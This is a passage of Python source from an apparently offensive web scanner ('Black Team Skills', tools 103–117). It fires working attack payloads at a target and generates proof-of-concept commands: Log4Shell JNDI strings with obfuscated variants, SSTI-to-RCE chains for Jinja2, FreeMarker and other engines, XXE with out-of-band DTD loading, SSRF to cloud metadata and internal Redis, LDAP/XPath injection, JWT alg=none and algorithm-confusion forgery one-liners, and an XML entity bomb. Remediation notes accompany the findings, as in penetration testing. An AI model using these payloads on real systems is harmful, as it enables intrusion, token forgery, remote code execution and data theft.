            # Predictable state
            probe2 = url + "?response_type=code&client_id=test&redirect_uri=http://localhost&state=1234"
            for label, probe in [("no_state", probe1), ("weak_state", probe2)]:
                try:
                    r = _fetch(probe, cfg.ua, cfg.timeout)
                    if r and r.status in (200, 302):
                        loc = r.headers.get("location", "")
                        if label == "no_state" and "state=" not in loc and r.status == 302:
                            profile.findings.append(Finding(
                                id="OAUTH-NO-STATE",
                                title="OAuth2 authorization redirects without state parameter",
                                severity="HIGH",
                                cvss=7.4,
                                cwe="CWE-352",
                                description=f"OAuth endpoint {path} redirected to '{loc[:80]}' without state parameter — CSRF attack possible.",
                                poc_curl=f"curl -sk -v '{probe1}' 2>&1 | grep location",
                                category="OAuth",
                                remediation="Generate a cryptographically random state, bind it to the session, and validate it on callback. Use PKCE as additional protection."
                            ))
                        if label == "weak_state" and "state=1234" in loc:
                            profile.findings.append(Finding(
                                id="OAUTH-WEAK-STATE",
                                title="OAuth2 state parameter reflected without validation",
                                severity="MEDIUM",
                                cvss=5.4,
                                cwe="CWE-330",
                                description=f"OAuth endpoint {path} reflected weak state '1234' in redirect — state may not be validated server-side.",
                                poc_curl=f"curl -sk -v '{probe2}' 2>&1 | grep location",
                                category="OAuth",
                                remediation="Validate state on callback: must match a server-side session-bound nonce. Min 128-bit entropy."
                            ))
                except Exception:
                    pass
        return profile

# ── Tool 104: Exposed Debug Endpoints (SKILL-114) ─────────────
class ExposedDebugEndpoints:
    """Find exposed framework debug/profiler/admin endpoints."""
    NAME = "Exposed Debug Endpoints"
    DEBUG_PATHS = [
        "/debug/pprof", "/debug/vars", "/debug/requests",
        "/__debug__/", "/_debug/", "/_profile",
        "/metrics", "/metrics/prometheus",
        "/jolokia", "/jolokia/read",
        "/_ah/admin", "/_ah/mail", "/_ah/warmup",
        "/druid/index.html", "/kibana",
        "/solr/admin", "/solr/admin/info/system",
        "/__admin__", "/__status__", "/__health__",
        "/telescope", "/telescope/requests",
        "/horizon", "/horizon/api/stats",
        "/_profiler/phpstorm", "/?XDEBUG_SESSION_START=1",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.DEBUG_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 403):
                    body = (r.body or b"").decode("utf-8", errors="replace")[:200]
                    sev = "HIGH" if r.status == 200 else "MEDIUM"
                    profile.findings.append(Finding(
                        id=f"DEBUG-EP-{path.replace('/','_')[:20].upper()}",
                        title=f"Debug/profiler endpoint accessible: {path}",
                        severity=sev,
                        cvss=7.5 if sev == "HIGH" else 4.3,
                        cwe="CWE-489",
                        description=f"{url} returned {r.status}. Content: {body[:100]}",
                        poc_curl=f"curl -sk {url}",
                        category="Information Disclosure",
                        remediation="Disable debug endpoints in production. Restrict with network ACL or remove entirely."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 105: Blind OS Command Injection (SKILL-115) ──────────
class BlindCMDInjection:
    """Send time-safe blind OS command injection payloads and detect via response delta."""
    NAME = "Blind CMDi"
    SAFE_PAYLOADS = [
        (";echo ApexHunter123", "ApexHunter123"),
        ("|echo ApexHunter123", "ApexHunter123"),
        ("&&echo ApexHunter123", "ApexHunter123"),
        ("$(echo ApexHunter123)", "ApexHunter123"),
        ("`echo ApexHunter123`", "ApexHunter123"),
    ]
    INJECT_PARAMS = ["name", "host", "ip", "ping", "cmd", "exec", "command",
                     "query", "search", "file", "path", "domain", "url"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param in self.INJECT_PARAMS[:6]:
            for suffix, marker in self.SAFE_PAYLOADS[:3]:
                url = profile.url.rstrip("/") + f"/?{param}=test{suffix}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.body:
                        body = r.body.decode("utf-8", errors="replace")
                        if marker in body:
                            profile.findings.append(Finding(
                                id="BLIND-CMDI",
                                title=f"Blind OS command injection via parameter '{param}'",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-78",
                                description=f"Parameter '{param}' executed 'echo {marker}' and reflection appeared in response body.",
                                poc_curl=f"curl -sk '{url}'",
                                category="Injection",
                                remediation="Never pass user input to OS shell functions. Use parameterized APIs. Whitelist-validate all shell-bound inputs."
                            ))
                            return profile
                except Exception:
                    pass
        return profile

# ══════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════
# TOOLS 106-125 — 20 Black Team Skills (Phase 10)
# ══════════════════════════════════════════════════════════════

# ── Tool 106: Log4Shell / JNDI Injection (SKILL-116) ──────────
class Log4ShellScanner:
    """Inject JNDI payloads into headers to detect Log4j RCE (CVE-2021-44228)."""
    NAME = "Log4Shell Scanner"
    # Safe detection payloads — no live LDAP server, only DNS-observable patterns
    JNDI_HEADERS = [
        "User-Agent", "X-Forwarded-For", "X-Api-Version",
        "X-Remote-IP", "X-Remote-Addr", "X-Originating-IP",
        "Referer", "CF-Connecting-IP", "True-Client-IP",
        "Accept-Language", "Authorization",
    ]
    # Uses a non-routable DNS label — change to your Burp Collaborator / interactsh host
    JNDI_PAYLOADS = [
        "${jndi:ldap://log4shell-detect.invalid/a}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://log4shell-detect.invalid/a}",
        "${${lower:j}ndi:ldap://log4shell-detect.invalid/a}",
        "${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4shell-detect.invalid/a}",
        "${jndi:dns://log4shell-detect.invalid/a}",
        "${jndi:rmi://log4shell-detect.invalid/a}",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for hdr in self.JNDI_HEADERS[:5]:
            for pl in self.JNDI_PAYLOADS[:3]:
                try:
                    r = _fetch(profile.url, cfg.ua, cfg.timeout,
                               headers_extra={hdr: pl})
                    if r and r.body:
                        body = r.body.decode("utf-8", errors="replace")
                        # Direct reflection = the server echoed the raw payload (bad sign)
                        if "${jndi:" in body or "log4shell-detect" in body:
                            profile.findings.append(Finding(
                                id="LOG4SHELL-REFLECT",
                                title=f"Log4Shell JNDI payload reflected in response (CVE-2021-44228)",
                                severity="CRITICAL",
                                cvss=10.0,
                                cwe="CWE-917",
                                description=f"Header '{hdr}' with JNDI payload was reflected unprocessed in response body — "
                                            "server may be echoing without lookup. Verify OOB DNS hit with Burp Collaborator.",
                                poc_curl=(
                                    f"curl -sk {profile.url} "
                                    f"-H '{hdr}: ${{jndi:ldap://YOUR_COLLABORATOR/a}}'"
                                ),
                                category="RCE",
                                remediation="Upgrade Log4j to ≥2.17.1. Set log4j2.formatMsgNoLookups=true. Block JNDI lookups at JVM level."
                            ))
                            return profile
                except Exception:
                    pass
        # Always emit an informational PoC for OOB testing
        poc_lines = "\n".join(
            f"curl -sk {profile.url} -H '{h}: ${{jndi:ldap://COLLAB/{i}}}'"
            for i, h in enumerate(self.JNDI_HEADERS[:5]))
        profile.findings.append(Finding(
            id="LOG4SHELL-OOB-POC",
            title="Log4Shell OOB PoC generated — requires Burp Collaborator / interactsh",
            severity="INFO",
            cvss=0.0,
            cwe="CWE-917",
            description=(
                "JNDI payloads were sent in 5 common headers. No server-side reflection "
                "detected passively. Use Burp Collaborator to observe DNS/HTTP callbacks."
            ),
            poc_curl=poc_lines,
            category="RCE",
            remediation="Upgrade Log4j to ≥2.17.1. Remove log4j from all JVM-based services. Block outbound LDAP/RMI."
        ))
        return profile

# ── Tool 107: XPath Injection (SKILL-117) ─────────────────────
class XPathInjection:
    """Detect XPath injection in login and search parameters."""
    NAME = "XPath Injection"
    XPATH_PAYLOADS = [
        ("' or '1'='1", "boolean bypass"),
        ("' or 1=1 or ''='", "boolean bypass 2"),
        ("x' or name()='username' or 'x'='y", "name() extract"),
        ("' or count(/*)>0 or '", "count probe"),
        ("admin' or '1'='1", "auth bypass"),
        ("' or substring(name(/*[1]),1,1)='a' or '", "blind enum"),
    ]
    PARAMS = [("username", "password"), ("user", "pass"),
              ("login", "pwd"), ("email", "password"), ("q", None)]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for (p1, p2) in self.PARAMS[:4]:
            for pl, label in self.XPATH_PAYLOADS[:4]:
                # POST form
                body_data = f"{p1}={pl}&{p2 or 'pass'}=test".encode() if p2 else f"{p1}={pl}".encode()
                try:
                    r = _fetch(profile.url, cfg.ua, cfg.timeout, "POST", body_data,
                               {"Content-Type": "application/x-www-form-urlencoded"})
                    if not r:
                        continue
                    resp_body = r.body.decode("utf-8", errors="replace") if r.body else ""
                    if any(sig in resp_body.lower() for sig in
                           ["xpath", "xmlpath", "unterminated string",
                            "invalid predicate", "namespace"]):
                        profile.findings.append(Finding(
                            id="XPATH-INJECT",
                            title=f"XPath injection via '{p1}' parameter ({label})",
                            severity="HIGH",
                            cvss=8.1,
                            cwe="CWE-643",
                            description=f"XPath error keywords appeared in response after injecting '{pl}' into '{p1}'. Possible XPath data store.",
                            poc_curl=(
                                f"curl -sk -X POST {profile.url} "
                                f"-d \"{p1}={pl}&{p2 or 'pass'}=test\""
                            ),
                            category="Injection",
                            remediation="Use parameterized XPath queries. Never concatenate user input into XPath expressions."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 108: LDAP Injection (SKILL-118) ──────────────────────
class LDAPInjection:
    """Detect LDAP injection in authentication and directory search endpoints."""
    NAME = "LDAP Injection"
    LDAP_PAYLOADS = [
        ("*)(uid=*", "wildcard bypass"),
        ("*)(|(uid=*", "OR injection"),
        ("admin)(&(password=x", "AND bypass"),
        ("*))%00", "null byte termination"),
        ("*()|&'", "special chars"),
        ("admin))(|(cn=*", "nested OR"),
    ]
    PARAMS = ["username", "user", "login", "email", "uid", "search", "q", "cn"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        LDAP_ERR = re.compile(
            r'ldap|javax\.naming|NamingException|invalid attribute|'
            r'ldap_search|Bad search filter|Size limit|sizelimit', re.I)
        for param in self.PARAMS[:5]:
            for pl, label in self.LDAP_PAYLOADS[:4]:
                url = profile.url.rstrip("/") + f"/?{param}={pl}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r:
                        continue
                    resp_body = r.body.decode("utf-8", errors="replace") if r.body else ""
                    if LDAP_ERR.search(resp_body):
                        profile.findings.append(Finding(
                            id="LDAP-INJECT",
                            title=f"LDAP injection via parameter '{param}' ({label})",
                            severity="HIGH",
                            cvss=8.8,
                            cwe="CWE-90",
                            description=f"LDAP error keywords in response for payload '{pl}' on '{param}'. Indicates unsanitized LDAP filter construction.",
                            poc_curl=f"curl -sk '{url}'",
                            category="Injection",
                            remediation="Escape LDAP special chars: ( ) * \\ NUL. Use LDAP SDK parameterized search filters."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 109: SSI / Edge-Side Include Injection (SKILL-119) ───
class SSIInjection:
    """Detect Server-Side Include and Edge-Side Include injection."""
    NAME = "SSI/ESI Injection"
    SSI_PAYLOADS = [
        "<!--#echo var=\"DATE_LOCAL\" -->",
        "<!--#exec cmd=\"echo ssi-test-apex\" -->",
        "<!--#include virtual=\"/etc/passwd\" -->",
        "<!--#printenv -->",
    ]
    ESI_PAYLOADS = [
        "<esi:include src=\"http://169.254.169.254/\" />",
        "<esi:include src=\"/etc/passwd\" />",
        "<esi:vars>$(HTTP_COOKIE)</esi:vars>",
    ]
    PARAMS = ["name", "message", "comment", "content", "text", "q", "search", "body"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        SSI_MARKERS = ["ssi-test-apex", "root:", "DATE_LOCAL", "SERVER_SOFTWARE",
                       "HTTP_HOST", "DOCUMENT_ROOT"]
        for param in self.PARAMS[:5]:
            for pl in (self.SSI_PAYLOADS + self.ESI_PAYLOADS)[:4]:
                url = profile.url.rstrip("/") + f"/?{param}={pl}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r:
                        continue
                    body = r.body.decode("utf-8", errors="replace") if r.body else ""
                    for marker in SSI_MARKERS:
                        if marker in body and pl not in body:
                            label = "SSI" if "<!--#" in pl else "ESI"
                            profile.findings.append(Finding(
                                id=f"{label}-INJECT",
                                title=f"{label} injection via '{param}' parameter",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-97",
                                description=f"{label} payload executed: marker '{marker}' appeared in response. Payload: {pl[:60]}",
                                poc_curl=f"curl -sk '{url}'",
                                category="Injection",
                                remediation=f"Disable {label} processing. Never render user input through server-side include engines."
                            ))
                            return profile
                except Exception:
                    pass
        return profile

# ── Tool 110: PDF / HTML-to-PDF SSRF (SKILL-120) ─────────────
class PDFGeneratorSSRF:
    """Detect SSRF and file-read via PDF/export generation endpoints."""
    NAME = "PDF Generator SSRF"
    PDF_PATHS = [
        "/api/export/pdf", "/api/pdf", "/pdf", "/export",
        "/api/export", "/print", "/api/print",
        "/api/report/pdf", "/api/generate",
        "/api/screenshot", "/api/render",
    ]
    SSRF_PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "file:///proc/self/environ",
        "http://localhost/server-status",
        "dict://localhost:11211/stat",
        "gopher://localhost:6379/_INFO%0a",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.PDF_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or r.status not in (200, 400, 405, 422):
                    continue
                # Endpoint exists — generate SSRF PoC
                poc_lines = []
                for pl in self.SSRF_PAYLOADS:
                    for param in ["url", "src", "source", "target", "html", "content"]:
                        poc_lines.append(
                            f"curl -sk -X POST {url} -H 'Content-Type: application/json' "
                            f"-d '{{\"url\":\"{pl}\",\"{param}\":\"{pl}\"}}'"
                        )
                profile.findings.append(Finding(
                    id=f"PDF-SSRF-{path.replace('/','_')[:15].upper()}",
                    title=f"PDF/export generator endpoint exposed: {path}",
                    severity="HIGH",
                    cvss=8.6,
                    cwe="CWE-918",
                    description=(
                        f"PDF/export endpoint {url} responded with HTTP {r.status}. "
                        "These endpoints commonly use headless Chromium or wkhtmltopdf which "
                        "can fetch arbitrary URLs — test for SSRF and local file read."
                    ),
                    poc_curl="\n".join(poc_lines[:3]),
                    category="SSRF",
                    remediation="Sanitize URL inputs to PDF renderers. Block access to internal networks from renderer process. Use a dedicated sandbox."
                ))
            except Exception:
                pass
        return profile

# ── Tool 111: JWT Algorithm Confusion RS256→HS256 (SKILL-121) ─
class JWTAlgorithmConfusion:
    """Forge JWT tokens using RS256→HS256 algorithm confusion attack."""
    NAME = "JWT Algorithm Confusion"
    JWT_HDR_PAT = re.compile(
        r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]*')
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        # Phase 1: locate a JWT in a well-known response
        for path in ["/api/me", "/api/token", "/api/auth/token",
                     "/oauth/token", "/.well-known/openid-configuration"]:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                auth_hdr = r.headers.get("authorization", "") + r.headers.get("www-authenticate", "")
                candidate = self.JWT_HDR_PAT.search(body) or self.JWT_HDR_PAT.search(auth_hdr)
                if candidate:
                    token = candidate.group(0)
                    # Decode header to check algorithm
                    import base64 as _b64
                    hdr_b64 = token.split(".")[0]
                    hdr_b64 += "=" * (-len(hdr_b64) % 4)
                    try:
                        hdr = json.loads(_b64.urlsafe_b64decode(hdr_b64).decode())
                    except Exception:
                        hdr = {}
                    alg = hdr.get("alg", "unknown")
                    if alg.startswith("RS") or alg.startswith("ES"):
                        profile.findings.append(Finding(
                            id="JWT-ALG-CONFUSION",
                            title=f"JWT uses asymmetric algorithm ({alg}) — test RS256→HS256 confusion",
                            severity="HIGH",
                            cvss=8.8,
                            cwe="CWE-327",
                            description=(
                                f"JWT with alg={alg} found at {path}. "
                                "Algorithm confusion attack: sign a forged token with HS256 using the server's RSA public key as the HMAC secret. "
                                "If the server trusts both RS256 and HS256, it will verify the forged token using the public key."
                            ),
                            poc_curl=(
                                f"# 1. Fetch public key: curl -sk {profile.url}/.well-known/jwks.json\n"
                                f"# 2. Forge with python-jwt:\n"
                                f"#    python3 -c \"import jwt,base64; pub=open('pub.pem').read(); "
                                f"print(jwt.encode({{'sub':'admin','role':'admin'}}, pub, algorithm='HS256'))\"\n"
                                f"# 3. Send forged token: curl -sk {url} -H 'Authorization: Bearer FORGED'"
                            ),
                            category="Authentication",
                            remediation="Enforce a single allowed algorithm per key. Reject HS256 tokens when using RS256. Use `algorithms=['RS256']` explicitly in JWT verification."
                        ))
                    elif alg == "none":
                        profile.findings.append(Finding(
                            id="JWT-ALG-NONE",
                            title="JWT with alg=none accepted — signature bypass",
                            severity="CRITICAL",
                            cvss=9.8,
                            cwe="CWE-347",
                            description=f"JWT found at {path} with alg=none. Server may accept unsigned tokens.",
                            poc_curl=(
                                f"# Forge unsigned token:\n"
                                f"python3 -c \""
                                f"import base64,json; "
                                f"h=base64.urlsafe_b64encode(json.dumps({{'alg':'none','typ':'JWT'}}).encode()).rstrip(b'=').decode(); "
                                f"p=base64.urlsafe_b64encode(json.dumps({{'sub':'admin','role':'admin'}}).encode()).rstrip(b'=').decode(); "
                                f"print(f'{{h}}.{{p}}.')\""
                            ),
                            category="Authentication",
                            remediation="Reject tokens with alg=none. Whitelist exactly one algorithm per application context."
                        ))
                    return profile
            except Exception:
                pass
        return profile

# ── Tool 112: Blind XXE via OOB DNS (SKILL-122) ───────────────
class BlindXXEOOB:
    """Generate OOB blind XXE payloads targeting DTD-loading XML parsers."""
    NAME = "Blind XXE OOB"
    XML_ENDPOINTS = [
        "/api/import", "/api/upload", "/api/xml", "/api/parse",
        "/soap", "/ws", "/api/soap", "/api/webhook",
        "/api/feed", "/api/rss", "/api/atom",
        "/api/sitemap.xml",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        XXE_PAYLOADS = [
            # Classic XXE file read
            ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
             '<root>&xxe;</root>'),
            # OOB DTD load (replace COLLAB with Burp Collaborator)
            ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://COLLAB/xxe.dtd">%dtd;]>'
             '<root/>'),
            # SVG XXE vector
            ('<svg xmlns="http://www.w3.org/2000/svg">'
             '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
             '<text>&xxe;</text></svg>'),
        ]
        CONTENT_TYPES = [
            "application/xml", "text/xml", "application/atom+xml",
            "application/rss+xml", "image/svg+xml",
        ]
        for path in self.XML_ENDPOINTS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 400, 405, 415, 422):
                    for ct in CONTENT_TYPES[:2]:
                        poc = XXE_PAYLOADS[0]
                        profile.findings.append(Finding(
                            id=f"XXE-OOB-{path.replace('/','_')[:15].upper()}",
                            title=f"XML endpoint exposed — blind XXE OOB payloads generated: {path}",
                            severity="HIGH",
                            cvss=8.6,
                            cwe="CWE-611",
                            description=(
                                f"Endpoint {url} accepts XML ({r.status}). "
                                "Replace COLLAB with your Burp Collaborator host for OOB exfiltration. "
                                "Classic file-read payload also generated."
                            ),
                            poc_curl=(
                                f"curl -sk -X POST {url} -H 'Content-Type: {ct}' "
                                f"--data-binary '{XXE_PAYLOADS[1]}'"
                            ),
                            category="XXE",
                            remediation="Disable external entity processing. Use defusedxml. Set FEATURE_EXTERNAL_GENERAL_ENTITIES=false."
                        ))
                        break
            except Exception:
                pass
        return profile

# ── Tool 113: SSTI → RCE Chain (SKILL-123) ───────────────────
class SSTIRCEChain:
    """Test SSTI payloads that escalate to RCE via class hierarchy traversal."""
    NAME = "SSTI RCE Chain"
    # Detection polyglot — safe expression, just evaluates math
    DETECT_PAYLOAD = "${7777+1}{{7777+1}}#{7777+1}*{7777+1}@(7777+1)"
    RCE_PAYLOADS = {
        "Jinja2":    "{{config.__class__.__init__.__globals__['os'].popen('echo APEX_RCE').read()}}",
        "Twig":      "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('echo APEX_RCE')}}",
        "FreeMarker": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"echo APEX_RCE\")}",
        "Velocity":  "#set($e=\"\")#set($x=$e.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",\"echo APEX_RCE\".class))",
        "Pebble":    "{% set os = 'java.lang.Runtime' | classLoading %}",
        "Mvel":      "new java.util.Scanner(Runtime.getRuntime().exec(new String[]{\"id\"}).getInputStream()).useDelimiter(\"\\\\A\").next()",
    }
    PARAMS = ["name", "template", "query", "message", "subject", "greeting",
              "title", "content", "text", "username", "search"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param in self.PARAMS[:6]:
            url = profile.url.rstrip("/") + f"/?{param}={self.DETECT_PAYLOAD}"
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                if "7778" in body:
                    engine = "Unknown"
                    if "{{7777+1}}" not in body and "7778" in body:
                        engine = "Jinja2/Twig"
                    elif "${7777+1}" not in body and "7778" in body:
                        engine = "FreeMarker/Velocity"
                    profile.findings.append(Finding(
                        id="SSTI-RCE-CHAIN",
                        title=f"SSTI → RCE chain — expression evaluated in '{param}' ({engine})",
                        severity="CRITICAL",
                        cvss=10.0,
                        cwe="CWE-94",
                        description=(
                            f"Math expression 7777+1=7778 evaluated in parameter '{param}'. "
                            f"Detected engine hint: {engine}. "
                            "RCE payload chain provided below — confirm manually."
                        ),
                        poc_curl="\n".join(
                            f"# {eng}: curl -sk '{profile.url}/?{param}={pl}'"
                            for eng, pl in self.RCE_PAYLOADS.items()
                        ),
                        category="RCE",
                        remediation="Use sandboxed template engines. Never pass user input to template rendering functions. Enforce strict mode with no class access."
                    ))
                    return profile
            except Exception:
                pass
        return profile

# ── Tool 114: Cache Poisoning Advanced (SKILL-124) ───────────
class CachePoisoningAdvanced:
    """Detect advanced cache poisoning: fat GET, unkeyed cookies, parameter cloaking."""
    NAME = "Cache Poisoning Advanced"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        tests = [
            # Fat GET: body in GET request
            {
                "label": "fat-GET",
                "method": "GET",
                "body": b"injected=apexpoison",
                "headers": {"Content-Type": "application/x-www-form-urlencoded",
                            "Content-Length": "19"},
            },
            # Unkeyed cookie injection
            {
                "label": "unkeyed-cookie",
                "method": "GET",
                "body": None,
                "headers": {"Cookie": "poison=apexpoison; session=legit"},
            },
            # X-Original-URL cache key normalisation
            {
                "label": "x-original-url",
                "method": "GET",
                "body": None,
                "headers": {"X-Original-URL": "/apexpoison"},
            },
            # Parameter cloaking via semicolons
            {
                "label": "param-cloak",
                "method": "GET",
                "body": None,
                "headers": {},
                "url_suffix": ";apexpoison=1",
            },
        ]
        for test in tests:
            url = profile.url + test.get("url_suffix", "")
            try:
                r = _fetch(url, cfg.ua, cfg.timeout, test["method"],
                           test.get("body"), test.get("headers", {}))
                if not r:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                cc = r.headers.get("cache-control", "")
                via = r.headers.get("via", "") + r.headers.get("x-cache", "")
                if "apexpoison" in body:
                    profile.findings.append(Finding(
                        id=f"CACHE-POISON-ADV-{test['label'].upper()}",
                        title=f"Advanced cache poisoning — '{test['label']}' reflected in response",
                        severity="HIGH",
                        cvss=8.2,
                        cwe="CWE-345",
                        description=f"Unkeyed input '{test['label']}' was reflected in response body. Cache-Control: {cc}, Via: {via}.",
                        poc_curl=f"curl -sk -X {test['method']} '{url}' " +
                                 " ".join(f"-H '{k}: {v}'" for k,v in test.get("headers",{}).items()),
                        category="Cache",
                        remediation="Ensure all user-controlled inputs are keyed in the cache key or stripped at the CDN edge."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 115: OAuth Token Referer Leakage (SKILL-125) ────────
class OAuthTokenRefererLeak:
    """Detect OAuth access tokens leaking via Referer to third-party resources."""
    NAME = "OAuth Token Referer Leak"
    OAUTH_CALLBACK_PATHS = [
        "/oauth/callback", "/auth/callback", "/oauth2/callback",
        "/api/oauth/callback", "/connect/callback",
        "/auth/redirect", "/oauth/redirect",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.OAUTH_CALLBACK_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url + "?code=test&state=test", cfg.ua, cfg.timeout)
                if not r:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                loc = r.headers.get("location", "")
                # If callback returns a page that loads third-party resources
                # with a token in the URL, the Referer header will leak the token
                third_party = re.findall(
                    r'src=["\']https?://(?!' + re.escape(profile.host) + r')[^"\']+["\']',
                    body, re.I)
                token_in_url = re.search(
                    r'[?&#](?:access_token|token|code)=[A-Za-z0-9_\-\.]{10,}', loc)
                if third_party and token_in_url:
                    profile.findings.append(Finding(
                        id="OAUTH-REFERER-LEAK",
                        title="OAuth token leaks via Referer to third-party resource",
                        severity="HIGH",
                        cvss=7.4,
                        cwe="CWE-598",
                        description=(
                            f"OAuth callback at {path} places token in URL ({loc[:80]}) "
                            f"then loads third-party resources: {third_party[0][:60]}. "
                            "The browser sends the token-bearing URL as Referer to the third party."
                        ),
                        poc_curl=f"curl -sk -v '{url}?code=test&state=test' 2>&1 | grep -i location",
                        category="OAuth",
                        remediation="Use fragment (#) instead of query string for tokens. Clear token from URL after exchange. Use strict Referrer-Policy: no-referrer."
                    ))
                elif r.status in (200, 302):
                    profile.findings.append(Finding(
                        id=f"OAUTH-CALLBACK-EXPOSED-{path.replace('/','_')[:15].upper()}",
                        title=f"OAuth callback endpoint exposed: {path}",
                        severity="INFO",
                        cvss=0.0,
                        cwe="CWE-598",
                        description=f"OAuth callback {url} responded {r.status}. Manually test for token-in-Referer leakage with third-party resources on the callback page.",
                        poc_curl=f"curl -sk -v '{url}?code=test&state=test' 2>&1 | grep -iE 'location|referer'",
                        category="OAuth",
                        remediation="Audit all resources loaded on the OAuth callback page for third-party origins."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 116: SOAP / XML Injection (SKILL-126) ────────────────
class SOAPXMLInjection:
    """Detect SOAP endpoints and test for XML injection, entity expansion, and schema attacks."""
    NAME = "SOAP/XML Injection"
    SOAP_PATHS = ["/ws", "/soap", "/api/soap", "/service", "/services",
                  "/webservice", "/webservices", "/wsdl", "/api/wsdl",
                  "/?wsdl", "/?WSDL", "/api?wsdl"]
    SOAP_PROBE = b"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <test><![CDATA[<inject/>]]></test>
  </soapenv:Body>
</soapenv:Envelope>"""
    BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>"""
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.SOAP_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 400, 405, 415, 500):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    is_soap = any(k in body.lower() for k in
                                  ["wsdl", "soap", "envelope", "definitions", "porttype"])
                    if not is_soap and r.status not in (200,):
                        continue
                    # Test CDATA injection
                    r2 = _fetch(url, cfg.ua, cfg.timeout, "POST", self.SOAP_PROBE,
                                {"Content-Type": "text/xml; charset=utf-8",
                                 "SOAPAction": '""'})
                    inject_sig = False
                    if r2 and r2.body:
                        b2 = r2.body.decode("utf-8", errors="replace")
                        inject_sig = "<inject" in b2 or "CDATA" in b2
                    profile.findings.append(Finding(
                        id=f"SOAP-INJECT-{path.replace('/','_')[:15].upper()}",
                        title=f"SOAP/XML endpoint exposed: {path}" + (" — CDATA reflected" if inject_sig else ""),
                        severity="HIGH" if inject_sig else "MEDIUM",
                        cvss=8.1 if inject_sig else 5.3,
                        cwe="CWE-91",
                        description=(
                            f"SOAP endpoint {url} responded {r.status}. "
                            + ("CDATA injection reflected in response. " if inject_sig else "")
                            + "Also test for Billion Laughs (XML bomb) and external entity attacks."
                        ),
                        poc_curl=(
                            f"curl -sk -X POST {url} -H 'Content-Type: text/xml' "
                            f"-H 'SOAPAction: \"\"' --data-binary @soap_inject.xml"
                        ),
                        category="Injection",
                        remediation="Disable DTD processing. Validate SOAP schema strictly. Use an XML firewall for SOAP services."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 117: PHP Type Juggling (SKILL-127) ───────────────────
class PHPTypeJuggling:
    """Detect PHP loose comparison vulnerabilities: 0e hashes, null==false, array bypass."""
    NAME = "PHP Type Juggling"
    JUGGLE_PAYLOADS = [
        # 0e magic hash — MD5("240610708") = 0e... → equals 0 in PHP
        ("password", "240610708", "0e magic hash"),
        ("password", "QNKCDZO",   "0e magic hash 2"),
        ("token",    "0",         "loose int comparison"),
        ("hash",     "0e1",       "scientific notation zero"),
        ("role",     "0",         "0==admin in loose PHP"),
        ("id",       "true",      "bool coercion"),
        ("id",       "null",      "null coercion"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param, val, label in self.JUGGLE_PAYLOADS[:6]:
            url = profile.url.rstrip("/") + f"/?{param}={val}"
            try:
